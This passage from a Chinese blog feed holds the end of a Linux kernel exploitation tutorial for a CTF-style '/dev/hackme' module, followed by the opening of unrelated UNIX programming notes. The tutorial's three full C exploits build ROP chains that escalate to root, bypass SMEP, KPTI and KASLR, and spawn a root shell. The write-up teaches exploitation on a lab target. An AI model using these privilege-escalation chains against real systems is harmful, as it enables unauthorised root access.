class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***getshell***&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>save_state();<br>signal(SIGSEGV, backdoor);<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">0x10</span> * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d\taddress:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c67f0</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = <span class="hljs-number">0xffffffff8150b97e</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff818c6b35</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff8166fea3</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c6410</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = <span class="hljs-number">0xffffffff8100a55f</span>; <span class="hljs-comment">//swapgs; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814381cb</span>; <span class="hljs-comment">//iretq; pop rbp; ret;</span><br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用swapgs-restore-regs-and-return-to-usermode"><a href="#使用swapgs-restore-regs-and-return-to-usermode" class="headerlink" title="使用swapgs_restore_regs_and_return_to_usermode"></a>使用swapgs_restore_regs_and_return_to_usermode</h2><p>第二种方式则是修改页表，CR3 寄存器是 x86 架构中的一种控制寄存器，用于存储页目录表（Page Directory Table）的物理地址。因此若能够修改CR3的值为用户空间的页表，那么就可以完成页表的切换，从而正常执行利用代码了。</p><p>那么在内核中存在一个函数<code>swapgs_restore_regs_and_return_to_usermode</code> ，<code>swapgs_restore_regs_and_return_to_usermode</code> 函数是在 x86 架构中用于从内核态切换到用户态的汇编代码片段。这个函数的作用是在内核态执行完系统调用或中断处理程序后，恢复用户态进程的寄存器状态，并返回到用户态进程的执行点继续执行。</p><p>在内核中搜索该函数的地址</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021608190.png" alt="image-20230702160843156"></p><p>可以看到在该函数的内部存在修改<code>CR3</code>的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表，但是该函数的起始位置会进行非常多的弹栈操作，如果直接使用很容易造成<code>ROP</code>链的空间不足，因此可以选择在<code>swapgs_restore_regs_and_return_to_usermode + 0x16</code>的位置开始执行。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021609583.png" alt="image-20230702160929530"></p><p>在该函数后续的执行中，还会执行<code>swapgs</code>的指令，切换<code>GS</code>的寄存器，并且做一个绝对跳转到<code>0xffffffff81200fco</code></p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021612072.png" alt="image-20230702161221025"></p><p>在该地址的后续还存在这<code>iretq</code>的指令，因此该函数具备了所有的条件。</p><p><img src="https://raw.githubusercontent.com/h0pe-ay/picgo/master/202307021613803.png" alt="image-20230702161336767"></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds </span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred </span><br><span class="hljs-comment">0xffffffff823d6b02: cmp rdi, 0xffffff; ret;</span><br><span class="hljs-comment">0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff8166ff23: mov rdi, rax; jne 0x86fef3; pop rbx; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret;</span><br><span class="hljs-comment">0xffffffff8100a55f: swapgs; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br><span class="hljs-comment">0xffffffff814381cb: iretq; pop rbp; ret;</span><br><span class="hljs-comment">0xffffffff8150b97e: pop rsi; ret;</span><br><span class="hljs-comment">0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs,user_rflags,user_sp,user_ss;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save state***&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_cs:0x%lx\n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_sp:0x%lx\n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_ss:0x%lx\n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_rflags:0x%lx\n&quot;</span>, user_rflags);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save finish***&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***getshell***&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>save_state();<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">0x10</span> * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d\taddress:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c67f0</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = <span class="hljs-number">0xffffffff8150b97e</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff81006370</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff818c6b35</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff8166fea3</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0xffffffff814c6410</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = <span class="hljs-number">0xffffffff81200f10</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="绕过SMAP"><a href="#绕过SMAP" class="headerlink" title="绕过SMAP"></a>绕过SMAP</h1><p><code>SMAP</code>则是防止在内核态时访问用户态的空间，此时使用<code>swapgs_restore_regs_and_return_to_usermode</code>函数也是完全可以绕过的，因此可以直接使用<code>swapgs_restore_regs_and_return_to_usermode</code>构建的<code>ROP</code>链。</p><p>但是如果遇到长度不够时，就能够将栈迁移到用户空间上了，因为在开启<code>SMAP</code>保护的时候就没有办法访问用户空间。那么此时只能借助内核的其他空间进行栈迁移，该手法利用比较复杂，因此留到以后再介绍。</p><h1 id="绕过KASLR"><a href="#绕过KASLR" class="headerlink" title="绕过KASLR"></a>绕过KASLR</h1><p><code>KASLR</code>与用户态下的<code>ASLR</code>差不多，都是开启了地址的随机化，因此不能使用绝对地址。</p><h2 id="run-sh-3"><a href="#run-sh-3" class="headerlink" title="run.sh"></a>run.sh</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">qemu-system-x86_64 \<br>    -m <span class="hljs-number">128</span>M \<br>    -cpu kvm64,+smep,+smap \<br>    -kernel vmlinuz \<br>    -initrd initramfs.cpio.gz \<br>    -hdb flag.txt \<br>    -snapshot \<br>    -nographic \<br>    -monitor /dev/null \<br>    -no-reboot \<br>    -append <span class="hljs-string">&quot;console=ttyS0  kaslr nofgkaslr kpti=1  quiet panic=1&quot;</span> \<br>    -s<br></code></pre></td></tr></table></figure><h2 id="泄露内核地址"><a href="#泄露内核地址" class="headerlink" title="泄露内核地址"></a>泄露内核地址</h2><p>通过泄露内核的程序基地址，再加上函数的偏移即可绕过，与用户态下的利用没有区别。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0xffffffff814c6410 T commit_creds --  [-3701815]</span><br><span class="hljs-comment">0xffffffff814c67f0 T prepare_kernel_cred -- [-3700823]</span><br><span class="hljs-comment">0xffffffff823d6b02: cmp rdi, 0xffffff; ret; -- [12094139]</span><br><span class="hljs-comment">0xffffffff8166fea3: mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; -- [-1958308]</span><br><span class="hljs-comment">0xffffffff81006370: pop rdi; ret;  --  [-8682711]</span><br><span class="hljs-comment">0xffffffff8100a55f: swapgs; pop rbp; ret; -- [-8665832]</span><br><span class="hljs-comment">0xffffffff818c6b35: add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; -- [494318]</span><br><span class="hljs-comment">0xffffffff814381cb: iretq; pop rbp; ret; -- [-4284028]</span><br><span class="hljs-comment">0xffffffff8150b97e: pop rsi; ret; -- [-3417801]</span><br><span class="hljs-comment">0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [-6607159]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_cs,user_rflags,user_sp,user_ss;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_state</span><span class="hljs-params">()</span><br>&#123;<br>__asm(<br><span class="hljs-string">&quot;.intel_syntax noprefix;&quot;</span><br><span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br><span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br><span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br><span class="hljs-string">&quot;pushf;&quot;</span><br><span class="hljs-string">&quot;pop user_rflags;&quot;</span><br><span class="hljs-string">&quot;.att_syntax;&quot;</span><br>);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save state***&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_cs:0x%lx\n&quot;</span>, user_cs);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_sp:0x%lx\n&quot;</span>, user_sp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_ss:0x%lx\n&quot;</span>, user_ss);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;user_rflags:0x%lx\n&quot;</span>, user_rflags);<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***save finish***&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">backdoor</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;***getshell***&quot;</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>save_state();<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/hackme&quot;</span>, O_RDWR);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> buf[<span class="hljs-number">256</span>];<br>read(fd, buf, <span class="hljs-number">0x10</span> * <span class="hljs-number">8</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i:%d\taddress:0x%lx\n&quot;</span>,i, buf[i]);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> canary = buf[<span class="hljs-number">2</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> payload[<span class="hljs-number">256</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">16</span>); i ++)<br>payload[index++] = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> leak_addr = buf[<span class="hljs-number">10</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak addr:0x%lx\n&quot;</span>, leak_addr);<br><span class="hljs-comment">//iretq RIP|CS|RFLAGS|SP|SS</span><br>payload[index++] = canary;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = leak_addr - <span class="hljs-number">8682711</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = leak_addr - <span class="hljs-number">3700823</span>; <span class="hljs-comment">//prepare_kernel_cred</span><br>payload[index++] = leak_addr - <span class="hljs-number">3417801</span>; <span class="hljs-comment">//pop_rsi_ret</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = leak_addr - <span class="hljs-number">8682711</span>; <span class="hljs-comment">//pop_rdi_ret</span><br>payload[index++] = <span class="hljs-number">1</span>;<br>payload[index++] = leak_addr + <span class="hljs-number">494318</span>; <span class="hljs-comment">//add rsi, 1; cmp rsi, rdi; jne 0xac6b30; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = leak_addr - <span class="hljs-number">1958308</span>; <span class="hljs-comment">//mov rdi, rax; jne 0x86fe73; pop rbx; pop rbp; ret; </span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = leak_addr - <span class="hljs-number">3701815</span>; <span class="hljs-comment">//commit_creds;</span><br>payload[index++] = leak_addr - <span class="hljs-number">6607159</span> + <span class="hljs-number">22</span>; <span class="hljs-comment">//swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;</span><br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = <span class="hljs-number">0</span>;<br>payload[index++] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)backdoor;<br>payload[index++] = user_cs;<br>payload[index++] = user_rflags;<br>payload[index++] = user_sp;<br>payload[index++] = user_ss;<br>write(fd, payload, index * <span class="hljs-number">8</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p><p><a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/</a></p><p><a href="https://blog.wohin.me/posts/linux-kernel-pwn-01/#case-1-disable-smepsmap-kpti-kaslr-and-fg-kaslr">https://blog.wohin.me/posts/linux-kernel-pwn-01/#case-1-disable-smepsmap-kpti-kaslr-and-fg-kaslr</a></p><p><a href="https://lore.kernel.org/all/202006082013.71E29A42@keescook/T/#u">https://lore.kernel.org/all/202006082013.71E29A42@keescook/T/#u</a></p>]]></content>
    
    
    <categories>
      
      <category>kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UNIX环境高级编程笔记</title>
    <link href="/2023/06/28/UNIX%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/06/28/UNIX%E7%8E%AF%E5%A2%83%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="错误提示"><a href="#错误提示" class="headerlink" title="错误提示"></a>错误提示</h1><h2 id="strerror"><a href="#strerror" class="headerlink" title="strerror"></a>strerror</h2><p>打印错误整型值对应的错误信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> *<span class="hljs-title function_">strerror</span><span class="hljs-params">(<span class="hljs-type">int</span> errnum)</span>;<br></code></pre></td></tr></table></figure><ul><li>参数一：<code>errnum</code>，传入错误整型值</li><li>返回值：返回错误整型值对应的错误信息</li></ul><h2 id="perror"><a href="#perror" class="headerlink" title="perror"></a>perror</h2><p>根据<code>errno</code>值打印相应的错误信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">perror</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span>;<br></code></pre></td></tr></table></figure><ul><li>参数一：<code>msg</code>，将<code>msg</code>添加到错误信息中</li></ul><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="open与openat"><a href="#open与openat" class="headerlink" title="open与openat"></a>open与openat</h2><p><code>open</code>与<code>openat</code>函数通过参数<code>fd</code>进行区分</p><ul><li>情况一：参数<code>pathname</code>为绝对路径，参数<code>fd</code>可以被忽略</li><li>情况二：参数<code>pathname</code>为相对路径，参数<code>fd</code>为文件描述符，此时<code>fd</code>描述符所在的文件夹为相对路径的起始位置</li><li>情况三：参数<code>pathname</code>为相对路径，参数<code>fd</code>为<code> AT_FDCWD</code>，此时当前目录为相对路径的起始位置，此时<code>open</code>与<code>openat</code>功能相似</li></ul><p><code>openat</code>对<code>open</code>的改进</p><ul><li>使得线程可以操作其他目录下的文件</li><li>防止<code>TOCTTOU</code>漏洞</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">open</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">int</span> oflag, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">openat</span><span class="hljs-params">(<span class="hljs-type">int</span> fd,<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path,<span class="hljs-type">int</span> oflag,..)</span><br></code></pre></td></tr></table></figure><ul><li><code>path</code>为打开文件的路径加名称</li><li><code>oflag</code>为权限</li></ul><h2 id="creat"><a href="#creat" class="headerlink" title="creat"></a>creat</h2><p><code>create</code>函数用于创建只写文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path,<span class="hljs-type">mode_t</span> mode)</span>;<br><br><span class="hljs-comment">//等价于</span><br>open(path,O_WROLY | O_CREAT | O_TRHUNK,mode);<br></code></pre></td></tr></table></figure><h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">close</span><span class="hljs-params">(<span 